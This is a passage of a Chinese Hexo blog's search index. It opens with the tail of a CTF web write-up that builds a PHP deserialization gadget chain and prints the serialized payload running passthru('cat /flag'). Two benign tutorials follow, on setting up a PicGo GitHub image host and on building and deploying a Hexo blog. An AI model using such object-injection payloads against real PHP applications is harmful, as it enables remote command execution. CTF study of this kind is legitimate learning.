class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lover</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit-&gt;yxx=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">web</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置GitHub图床</title>
      <link href="/2023/11/03/%E9%85%8D%E7%BD%AEGitHub%E5%9B%BE%E5%BA%8A/"/>
      <url>/2023/11/03/%E9%85%8D%E7%BD%AEGitHub%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="采用PicGo来配置GitHub图床"><a href="#采用PicGo来配置GitHub图床" class="headerlink" title="采用PicGo来配置GitHub图床"></a>采用PicGo来配置GitHub图床</h1><p>转到picgo的GitHub图床设置来看配置信息：</p><ol><li>我们新建一个仓库来存放图片，比如我开了一个image的仓库，那格式就为&lt;github用户名&gt;&#x2F;image</li><li>分支名以前默认是master，现在是main，如果不创建其他分支填main就好</li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/picgo2.png" alt="picgo2"></p><ol start="3"><li>token是最重要的一步，用来识别你的身份，创建token的时候一定要勾选repo选项不然会上传失败，报各种权限不足。。。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/picgo1.png" alt="picgo1"></p><ol start="4"><li>最后在图床上面上传一张图片看是否能成功</li></ol><p>如果要和typora一起用直接在偏好设置中设置使用picgo上传即可。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20231103224740889.png" alt="image-20231103224740889"></p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo blog 搭建</title>
      <link href="/2023/11/03/hexo-%E6%90%AD%E5%BB%BAblog/"/>
      <url>/2023/11/03/hexo-%E6%90%AD%E5%BB%BAblog/</url>
      
        <content type="html"><![CDATA[<p>这篇文章记录一下blog的搭建</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ol><li>github账号</li><li>安装git</li><li>安装nodejs</li></ol><p>这些安装找个教程即可</p><h2 id="npm修改全局包位置"><a href="#npm修改全局包位置" class="headerlink" title="npm修改全局包位置"></a>npm修改全局包位置</h2><p>这里是为了不占用c盘的空间，npm安装的包默认在c盘</p><p>这里了解了几个命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm root -g           // 查看全局包的安装目录<br>npm list -g --depth 0 // 查看全局安装过的包<br></code></pre></td></tr></table></figure><blockquote><p>npm list命令可能会报错，这时候更新一下npm就可以了</p><p>npm update -g –verbose</p></blockquote><p>npm安装分为两类：全局包和项目包</p><p>全局安装: 包被安装到了系统目录（一般在系统盘的node_modules中）。</p><ul><li>命令：<code>npm install -g 包名</code> 或者 <code>npm install 包名 -g</code></li></ul><p>项目安装（或者叫本地安装)，包安装在当前项目的根目录下（与package.json同级）的node_modules中。</p><ul><li>命令：<code>npm install 包名</code></li></ul><p>步骤：</p><ol><li><p>在要安装依赖的目录下新建两个文件夹</p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/1.png"></p><ol start="2"><li><p>在cmd中执行下面两条指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm config set prefix&quot;nodeglobal路径&quot;<br>npm config set cache &quot;node_cache路径&quot;<br></code></pre></td></tr></table></figure><p>这两条命令修改了存放路径，但是还要修改环境变量系统才知道</p></li><li><p>系统变量添加NODE_PATH，路径为node_global下的node_modules；用户变量的路径中添加node_global的路径即可<img src="https://raw.githubusercontent.com/clowsman/image/main/8.png" alt="8"></p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/2.png" alt="2"></p></li><li><p>用npm root -g 命令查看一下是否成功了<img src="https://raw.githubusercontent.com/clowsman/image/main/3.png"></p></li></ol></li></ol><h1 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h1><p>这里搜搜教程就好了。</p><h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p>去hexo的官网会有安装命令，如下按顺序执行：</p><blockquote><p>在此之前先新建文件夹在我们要的博客目录下，在该目录打开git bash<img src="https://raw.githubusercontent.com/clowsman/image/main/4.png"></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm install hexo-cli -g<br>hexo init blog<br>cd blog<br>npm install<br>hexo server //也可以缩写成hexo s<br></code></pre></td></tr></table></figure><blockquote><p>所有操作在git控制台操作就好，不需要Windows的控制台，因为会装到上面这是全局包那里的目录</p></blockquote><p>输入第五行命令之后就可以看到博客地址：</p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/7.png"></p><p>进行网页之后会给我们一些命令提示：</p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/5.png"></p><h1 id="日常操作使用"><a href="#日常操作使用" class="headerlink" title="日常操作使用"></a>日常操作使用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hexo new &lt;文章标题&gt;<br></code></pre></td></tr></table></figure><p>创建一篇新文章，可以在source&#x2F;_posts文件夹中看到文章的文件，是md文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hexo generate//也可以写成 hexo g<br></code></pre></td></tr></table></figure><p>用于生成静态网页，在更改博客后可以使用该命令，但刷新一下网页其实也可以</p><h1 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h1><p>我们可以去hexo官网点击下面的探索主题找自己想要的主题;选好之后就会跳到主题的github网页，里面有详细说明可以自己看</p><h1 id="发布到github-pages"><a href="#发布到github-pages" class="headerlink" title="发布到github pages"></a>发布到github pages</h1><p>安装hexo-deployer-git</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>然后我们需要去修改_config.yml下的文件的deploy选项：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deploy:<br>  type: git<br>  repo: https://github.com/clowsman/clowsman.github.io.git<br>  branch: main<br>  token: <br></code></pre></td></tr></table></figure><blockquote><p>注意冒号后一定要空格</p></blockquote><p>但是上面使用token的方式我的会报错，可能是repo地址的问题，所以改成ssh的方式来试一试，ssh就可以不要token了</p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/6.png"></p><p>复制该ssh地址即可</p><blockquote><p>使用之前记得将git绑定ssh</p></blockquote><h1 id="文章头部的一些关键字"><a href="#文章头部的一些关键字" class="headerlink" title="文章头部的一些关键字"></a>文章头部的一些关键字</h1><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>layout</code></td><td align="left">布局</td><td align="left"><a href="https://hexo.io/zh-cn/docs/configuration#%E6%96%87%E7%AB%A0"><code>config.default_layout</code></a></td></tr><tr><td align="left"><code>title</code></td><td align="left">标题</td><td align="left">文章的文件名</td></tr><tr><td align="left"><code>date</code></td><td align="left">建立日期</td><td align="left">文件建立日期</td></tr><tr><td align="left"><code>updated</code></td><td align="left">更新日期</td><td align="left">文件更新日期</td></tr><tr><td align="left"><code>comments</code></td><td align="left">开启文章的评论功能</td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>tags</code></td><td align="left">标签（不适用于分页）</td><td align="left"></td></tr><tr><td align="left"><code>categories</code></td><td align="left">分类（不适用于分页）</td><td align="left"></td></tr><tr><td align="left"><code>permalink</code></td><td align="left">覆盖文章的永久链接，永久链接应该以 <code>/</code> 或 <code>.html</code> 结尾</td><td align="left"><code>null</code></td></tr><tr><td align="left"><code>excerpt</code></td><td align="left">纯文本的页面摘要。使用 <a href="https://hexo.io/zh-cn/docs/tag-plugins#%E6%96%87%E7%AB%A0%E6%91%98%E8%A6%81%E5%92%8C%E6%88%AA%E6%96%AD">该插件</a> 来格式化文本</td><td align="left"></td></tr><tr><td align="left"><code>disableNunjucks</code></td><td align="left">启用时禁用 Nunjucks 标签 <code>&#123;&#123; &#125;&#125;</code>&#x2F;<code>&#123;% %&#125;</code> 和 <a href="https://hexo.io/zh-cn/docs/tag-plugins">标签插件</a> 的渲染功能</td><td align="left">false</td></tr><tr><td align="left"><code>lang</code></td><td align="left">设置语言以覆盖 <a href="https://hexo.io/zh-cn/docs/internationalization#%E8%B7%AF%E5%BE%84">自动检测</a></td><td align="left">继承自 <code>_config.yml</code></td></tr><tr><td align="left"><code>published</code></td><td align="left">文章是否发布</td><td align="left">对于 <code>_posts</code> 下的文章为 <code>true</code>，对于 <code>_draft</code> 下的文章为 <code>false</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>